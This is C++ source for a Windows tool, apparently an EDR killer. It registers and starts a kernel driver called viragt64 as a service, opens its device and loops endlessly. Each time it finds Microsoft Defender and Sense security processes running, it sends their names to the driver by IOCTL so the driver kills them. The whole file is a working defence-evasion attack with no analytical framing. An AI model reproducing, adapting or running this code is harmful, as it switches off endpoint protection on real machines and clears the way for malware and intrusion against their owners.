// viragt64.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wchar.h>
#include <signal.h>

#define DRIVER_NAME L"viragt64"
#define IOCTL_CODE 0x82730030

const wchar_t* edrNames[] = {
        L"MsMpEng.exe",
        L"SecurityHealthService.exe",
        L"SecurityHealthSystray.exe",
        L"MsSense.exe",
        L"SenseNdr.exe",
        L"SenseTVM.exe",
        L"NisSrv.exe"
};

const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);

typedef struct _TERMINATE_STRUCTURE {
    char PROCESS_NAME[256];
}TERMINATE_STRUCTURE, * PTERMINATE_STRUCTURE;

BOOL FindEDR(const wchar_t* processName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (wcscmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return TRUE;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return FALSE;
}

void LoadDriver(const wchar_t* DRIVER_PATH) {
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (scmHandle == NULL) {
        printf("[-] Failed to open Service Control Manager.\n");
        return;
    }

    SC_HANDLE serviceHandle = CreateService(
        scmHandle,
        DRIVER_NAME,             // Service name
        DRIVER_NAME,             // Display name
        SERVICE_START | DELETE | SERVICE_STOP,  // Desired access permissions
        SERVICE_KERNEL_DRIVER,   // Service type
        SERVICE_DEMAND_START,    // Start type
        SERVICE_ERROR_IGNORE,    // Ignore errors if the service fails
        DRIVER_PATH,             // Path to driver file
        NULL, NULL, NULL, NULL, NULL
    );

    if (serviceHandle == NULL) {
        // Check if the service already exists
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            printf("[+] Service already exists, attempting to start.\n");
            serviceHandle = OpenService(scmHandle, DRIVER_NAME, SERVICE_START);
        }
        else {
            printf("[-] Failed to create service.\n");
            CloseServiceHandle(scmHandle);
            return;
        }
    }

    // Attempt to start the service
    BOOL status = StartService(serviceHandle, 0, NULL);
    if (status) {
        printf("[+] Started service successfully!\n");
    }
    else if (status == ERROR_SERVICE_ALREADY_RUNNING) {
        printf("[+] Service is already running...\n");
    }
    else {
        printf("[-] Failed to start the service, error: %d\n", GetLastError());
    }
    // Clean up handles
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
}

void UnloadDriver() {
    // Open the Service Control Manager with full access
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scmHandle == NULL) {
        printf("[-] Failed to open Service Control Manager.\n");
        return;
    }
    // Open the driver service with permission to stop and delete
    SC_HANDLE serviceHandle = OpenService(scmHandle, DRIVER_NAME, SERVICE_STOP | DELETE);
    if (serviceHandle == NULL) {
        printf("[-] Failed to open service.\n");
        CloseServiceHandle(scmHandle);
        return;
    }

    // Stop the driver service
    SERVICE_STATUS status;
    if (ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
        printf("[+] Driver stopped successfully.\n");
    }
    else {
        printf("[-] Failed to stop service.\n");
    }

    // Delete the driver service
    if (DeleteService(serviceHandle)) {
        printf("[+] Service deleted successfully.\n");
    }
    else {
        printf("[-] Failed to delete service.\n");
    }
    // Clean up handles
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
}

void Cleanup(int sig) {
    wprintf(L"[+] Pressed Ctrl+C...\n");
    // Put your cleanup code here
    UnloadDriver();
    exit(0); // Exit the program gracefully
}

int wmain(int argc, wchar_t* argv[])
{
    // Load or Start the Driver
    if (argc >= 2 && (wcscmp(argv[1], L"-h") == 0 || wcscmp(argv[1], L"--help") == 0)) {
        wprintf(L"[+] Usage: %ls -l/--load <driver.sys>\n", argv[0]);
        return 0;
    }

    if (argc == 3 && (wcscmp(argv[1], L"-l") == 0 || wcscmp(argv[1], L"--load") == 0)) {
        wchar_t fullPath[MAX_PATH];
        DWORD length = GetFullPathNameW(argv[2], MAX_PATH, fullPath, NULL);
        printf("[+] Attempting to load the driver\n");
        LoadDriver(fullPath);
        signal(SIGINT, Cleanup);
    }

    printf("[+] Opening handle to device..\n");
    HANDLE hDriver = CreateFileW(
        L"\\\\.\\Viragtlt",
        GENERIC_WRITE | GENERIC_READ,
        0,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr);

    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Failed to open handle: %d", GetLastError());
        return 1;
    }

    while (true) {
        for (size_t i = 0; i < edrCount; i++) {

            BOOL EDRPID;
            EDRPID = FindEDR(edrNames[i]);

            if (EDRPID) {

                wprintf(L"[+] Calling ProcessTerminator to Kill %ls....", edrNames[i]);

                char EDR_NAME[256];
                int result = WideCharToMultiByte(
                    CP_ACP,              // Code page (ANSI)
                    0,                   // Flags
                    edrNames[i],         // Wide char string
                    -1,                  // Null-terminated input
                    EDR_NAME,         // Output buffer
                    sizeof(EDR_NAME), // Size of buffer
                    NULL,                // Default char
                    NULL                 // Used default char?
                );

                TERMINATE_STRUCTURE EDRProcess = { 0 };
                strcpy_s(EDRProcess.PROCESS_NAME, sizeof(EDRProcess.PROCESS_NAME), EDR_NAME);

                // Terminate EDR
                NTSTATUS success = DeviceIoControl(
                    hDriver,
                    IOCTL_CODE,
                    &EDRProcess,
                    sizeof(EDRProcess),
                    nullptr,
                    0,
                    nullptr,
                    nullptr);

                if (success) {
                    printf("success\n");
                }
                else {
                    printf("failed\n");
                }
            }
        }
    }

    Sleep(1000);
}